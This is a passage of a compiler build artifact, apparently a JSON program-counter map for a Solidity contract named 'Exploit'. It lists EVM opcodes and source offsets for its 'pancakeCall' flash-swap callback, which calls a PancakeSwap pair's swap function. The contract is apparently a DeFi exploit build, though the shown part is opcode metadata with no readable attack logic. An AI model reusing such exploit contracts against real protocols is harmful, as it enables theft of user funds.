      ],
      "op": "JUMPI",
      "path": "0"
    },
    "527": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3249,
        3269
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x216"
    },
    "530": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3249,
        3269
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1344"
    },
    "533": {
      "fn": "Exploit.pancakeCall",
      "jump": "i",
      "offset": [
        3249,
        3269
      ],
      "op": "JUMP",
      "path": "0"
    },
    "534": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3249,
        3269
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "535": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3249,
        3269
      ],
      "op": "ADD",
      "path": "0"
    },
    "536": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3249,
        3269
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "537": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "539": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "541": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "543": {
      "op": "SHL"
    },
    "544": {
      "op": "SUB"
    },
    "545": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3249,
        3269
      ],
      "op": "AND",
      "path": "0"
    },
    "546": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3275
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x22C0D9F"
    },
    "551": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3249,
        3269
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "553": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3279,
        3290
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x233"
    },
    "556": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3249,
        3269
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1"
    },
    "558": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3279,
        3286
      ],
      "op": "DUP6",
      "path": "0"
    },
    "559": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3279,
        3290
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x13EA"
    },
    "562": {
      "fn": "Exploit.pancakeCall",
      "jump": "i",
      "offset": [
        3279,
        3290
      ],
      "op": "JUMP",
      "path": "0"
    },
    "563": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3279,
        3290
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "564": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3307,
        3323
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "566": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3307,
        3323
      ],
      "op": "DUP1",
      "path": "0"
    },
    "567": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3307,
        3323
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "568": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3318,
        3319
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "570": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3307,
        3323
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "572": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3307,
        3323
      ],
      "op": "DUP3",
      "path": "0"
    },
    "573": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3307,
        3323
      ],
      "op": "ADD",
      "path": "0"
    },
    "574": {
      "op": "MSTORE"
    },
    "575": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3321,
        3322
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1"
    },
    "577": {
      "op": "DUP2"
    },
    "578": {
      "op": "DUP4"
    },
    "579": {
      "op": "ADD"
    },
    "580": {
      "op": "MSTORE"
    },
    "581": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3307,
        3323
      ],
      "op": "DUP2",
      "path": "0"
    },
    "582": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3307,
        3323
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "583": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3307,
        3323
      ],
      "op": "DUP1",
      "path": "0"
    },
    "584": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3307,
        3323
      ],
      "op": "DUP3",
      "path": "0"
    },
    "585": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3307,
        3323
      ],
      "op": "SUB",
      "path": "0"
    },
    "586": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3307,
        3323
      ],
      "op": "DUP4",
      "path": "0"
    },
    "587": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3307,
        3323
      ],
      "op": "ADD",
      "path": "0"
    },
    "588": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3307,
        3323
      ],
      "op": "DUP2",
      "path": "0"
    },
    "589": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3307,
        3323
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "590": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "592": {
      "op": "DUP3"
    },
    "593": {
      "op": "ADD"
    },
    "594": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3307,
        3323
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "595": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3307,
        3323
      ],
      "op": "DUP4",
      "path": "0"
    },
    "596": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3307,
        3323
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "597": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3307,
        3323
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "598": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "600": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "602": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "604": {
      "op": "SHL"
    },
    "605": {
      "op": "SUB"
    },
    "606": {
      "op": "NOT"
    },
    "607": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xE0"
    },
    "609": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "DUP8",
      "path": "0"
    },
    "610": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "611": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "SHL",
      "path": "0"
    },
    "612": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "AND",
      "path": "0"
    },
    "613": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "614": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "615": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "616": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x277"
    },
    "619": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "SWAP4",
      "path": "0"
    },
    "620": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "621": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "622": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3300,
        3304
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "623": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3300,
        3304
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "624": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x64"
    },
    "626": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "ADD",
      "path": "0"
    },
    "627": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x144E"
    },
    "630": {
      "fn": "Exploit.pancakeCall",
      "jump": "i",
      "offset": [
        3236,
        3324
      ],
      "op": "JUMP",
      "path": "0"
    },
    "631": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "632": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "634": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "636": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "637": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "DUP1",
      "path": "0"
    },
    "638": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "DUP4",
      "path": "0"
    },
    "639": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "SUB",
      "path": "0"
    },
    "640": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "DUP2",
      "path": "0"
    },
    "641": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "643": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "DUP8",
      "path": "0"
    },
    "644": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "DUP1",
      "path": "0"
    },
    "645": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "EXTCODESIZE",
      "path": "0"
    },
    "646": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "647": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "DUP1",
      "path": "0"
    },
    "648": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "649": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x291"
    },
    "652": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "653": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "655": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "DUP1",
      "path": "0"
    },
    "656": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "REVERT",
      "path": "0"
    },
    "657": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "658": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "POP",
      "path": "0"
    },
    "659": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "GAS",
      "path": "0"
    },
    "660": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "CALL",
      "path": "0"
    },
    "661": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "662": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "DUP1",
      "path": "0"
    },
    "663": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "664": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2A5"
    },
    "667": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "668": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "669": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "671": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "DUP1",
      "path": "0"
    },
    "672": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "673": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "674": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "676": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "REVERT",
      "path": "0"
    },
    "677": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "678": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "POP",
      "path": "0"
    },
    "679": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "POP",
      "path": "0"
    },
    "680": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "POP",
      "path": "0"
    },
    "681": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3236,
        3324
      ],
      "op": "POP",
      "path": "0"
    },
    "682": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3124,
        3495
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x357"
    },
    "685": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3124,
        3495
      ],
      "op": "JUMP",
      "path": "0"
    },
    "686": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3124,
        3495
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "687": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3405,
        3419
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 2,
      "value": "0x8"
    },
    "689": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3420,
        3424
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1"
    },
    "691": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3420,
        3424
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "692": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3405,
        3425
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x7"
    },
    "694": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3405,
        3425
      ],
      "op": "DUP2",
      "path": "0"
    },
    "695": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3405,
        3425
      ],
      "op": "LT",
      "path": "0"
    },
    "696": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3405,
        3425
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C3"
    },
    "699": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3405,
        3425
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "700": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3405,
        3425
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C3"
    },
    "703": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3405,
        3425
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1344"
    },
    "706": {
      "fn": "Exploit.pancakeCall",
      "jump": "i",
      "offset": [
        3405,
        3425
      ],
      "op": "JUMP",
      "path": "0"
    },
    "707": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3405,
        3425
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "708": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3405,
        3425
      ],
      "op": "ADD",
      "path": "0"
    },
    "709": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3405,
        3425
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "710": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "712": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "714": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "716": {
      "op": "SHL"
    },
    "717": {
      "op": "SUB"
    },
    "718": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3405,
        3425
      ],
      "op": "AND",
      "path": "0"
    },
    "719": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3431
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x22C0D9F"
    },
    "724": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3432,
        3443
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2DE"
    },
    "727": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3405,
        3425
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1"
    },
    "729": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3432,
        3439
      ],
      "op": "DUP6",
      "path": "0"
    },
    "730": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3432,
        3443
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x13EA"
    },
    "733": {
      "fn": "Exploit.pancakeCall",
      "jump": "i",
      "offset": [
        3432,
        3443
      ],
      "op": "JUMP",
      "path": "0"
    },
    "734": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3432,
        3443
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "735": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3463,
        3479
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "737": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3463,
        3479
      ],
      "op": "DUP1",
      "path": "0"
    },
    "738": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3463,
        3479
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "739": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3445,
        3446
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "741": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3463,
        3479
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "743": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3463,
        3479
      ],
      "op": "DUP3",
      "path": "0"
    },
    "744": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3463,
        3479
      ],
      "op": "ADD",
      "path": "0"
    },
    "745": {
      "op": "DUP2"
    },
    "746": {
      "op": "SWAP1"
    },
    "747": {
      "op": "MSTORE"
    },
    "748": {
      "op": "SWAP2"
    },
    "749": {
      "op": "DUP2"
    },
    "750": {
      "op": "ADD"
    },
    "751": {
      "op": "DUP3"
    },
    "752": {
      "op": "SWAP1"
    },
    "753": {
      "op": "MSTORE"
    },
    "754": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3456,
        3460
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "755": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3456,
        3460
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "756": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "758": {
      "op": "ADD"
    },
    "759": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3463,
        3479
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "761": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3463,
        3479
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "762": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3463,
        3479
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "764": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3463,
        3479
      ],
      "op": "DUP2",
      "path": "0"
    },
    "765": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3463,
        3479
      ],
      "op": "DUP4",
      "path": "0"
    },
    "766": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3463,
        3479
      ],
      "op": "SUB",
      "path": "0"
    },
    "767": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3463,
        3479
      ],
      "op": "SUB",
      "path": "0"
    },
    "768": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3463,
        3479
      ],
      "op": "DUP2",
      "path": "0"
    },
    "769": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3463,
        3479
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "770": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3463,
        3479
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "771": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3463,
        3479
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "773": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3463,
        3479
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "774": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "776": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "777": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "DUP6",
      "path": "0"
    },
    "778": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xFFFFFFFF"
    },
    "783": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "AND",
      "path": "0"
    },
    "784": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xE0"
    },
    "786": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "SHL",
      "path": "0"
    },
    "787": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "DUP2",
      "path": "0"
    },
    "788": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "789": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "791": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "ADD",
      "path": "0"
    },
    "792": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x324"
    },
    "795": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "SWAP5",
      "path": "0"
    },
    "796": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "SWAP4",
      "path": "0"
    },
    "797": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "798": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "799": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "800": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x144E"
    },
    "803": {
      "fn": "Exploit.pancakeCall",
      "jump": "i",
      "offset": [
        3392,
        3480
      ],
      "op": "JUMP",
      "path": "0"
    },
    "804": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "805": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "807": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "809": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "810": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "DUP1",
      "path": "0"
    },
    "811": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "DUP4",
      "path": "0"
    },
    "812": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "SUB",
      "path": "0"
    },
    "813": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "DUP2",
      "path": "0"
    },
    "814": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "816": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "DUP8",
      "path": "0"
    },
    "817": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "DUP1",
      "path": "0"
    },
    "818": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "EXTCODESIZE",
      "path": "0"
    },
    "819": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "820": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "DUP1",
      "path": "0"
    },
    "821": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "822": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x33E"
    },
    "825": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "826": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "828": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "DUP1",
      "path": "0"
    },
    "829": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "REVERT",
      "path": "0"
    },
    "830": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "831": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "POP",
      "path": "0"
    },
    "832": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "GAS",
      "path": "0"
    },
    "833": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "CALL",
      "path": "0"
    },
    "834": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "835": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "DUP1",
      "path": "0"
    },
    "836": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "837": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x352"
    },
    "840": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "841": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "842": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "844": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "DUP1",
      "path": "0"
    },
    "845": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "846": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "847": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "849": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "REVERT",
      "path": "0"
    },
    "850": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "851": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "POP",
      "path": "0"
    },
    "852": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "POP",
      "path": "0"
    },
    "853": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
